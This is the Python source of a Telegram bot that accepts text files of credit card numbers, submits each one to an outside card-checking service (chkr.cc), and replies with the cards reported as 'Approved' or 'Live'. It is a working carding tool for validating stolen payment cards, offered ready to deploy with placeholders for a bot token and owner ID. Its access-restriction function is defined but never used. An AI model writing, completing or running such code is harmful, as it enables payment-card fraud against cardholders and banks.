import os
import requests
import logging
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext

# ✅ Replace with your own values
BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
OWNER_ID = 123456789  # Replace with your Telegram user ID

# ✅ Function to check CCs using chkr.cc API
def check_cc(cc_details):
    headers = {
        'authority': 'chkr.cc',
        'accept': '*/*',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://chkr.cc',
        'referer': 'https://chkr.cc/',
        'user-agent': 'Mozilla/5.0',
    }

    data = {
        'data': cc_details,
        'key': ''  # Add API key if required
    }

    try:
        response = requests.post('https://chkr.cc/api.php', headers=headers, data=data)
        if response.status_code == 200:
            response_json = response.json()
            return response_json.get('msg', 'Unknown Response')
        else:
            return f"HTTP Error {response.status_code}"
    except requests.exceptions.RequestException as e:
        return f"Request Error: {e}"

# ✅ Handle `/start` command
def start(update: Update, context: CallbackContext):
    user = update.effective_user
    update.message.reply_text(f"Hello {user.first_name}! Send me a TXT file containing CCs to check.")

# ✅ Handle file uploads (TXT files)
def handle_file(update: Update, context: CallbackContext):
    file = update.message.document

    # Ensure it's a .txt file
    if not file.file_name.endswith(".txt"):
        update.message.reply_text("Please send a .TXT file!")
        return

    # Download file
    file_path = f"{file.file_name}"
    file = context.bot.get_file(file.file_id)
    file.download(file_path)

    # Process file
    with open(file_path, "r") as f:
        ccs = f.readlines()

    approved_ccs = []
    for cc in ccs:
        cc = cc.strip()
        if cc:
            result = check_cc(cc)
            if "Approved" in result or "Live" in result:
                approved_ccs.append(cc)

    # Delete the file after processing
    os.remove(file_path)

    # Send response
    if approved_ccs:
        message = f"✅ Approved CCs:\n" + "\n".join(approved_ccs)
    else:
        message = "❌ No Approved CCs found."

    update.message.reply_text(message)

# ✅ Restrict access to only OWNER_ID
def restricted(update: Update, context: CallbackContext):
    if update.message.from_user.id != OWNER_ID:
        update.message.reply_text("🚫 You are not authorized to use this bot.")
        return False
    return True

# ✅ Handle unknown messages
def unknown(update: Update, context: CallbackContext):
    update.message.reply_text("Unknown command! Send a TXT file to check CCs.")

# ✅ Main function to run the bot
def main():
    updater = Updater(BOT_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Commands
    dp.add_handler(CommandHandler("start", start))
    
    # File handling
    dp.add_handler(MessageHandler(Filters.document, handle_file))

    # Unknown commands
    dp.add_handler(MessageHandler(Filters.text, unknown))

    # Start bot
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
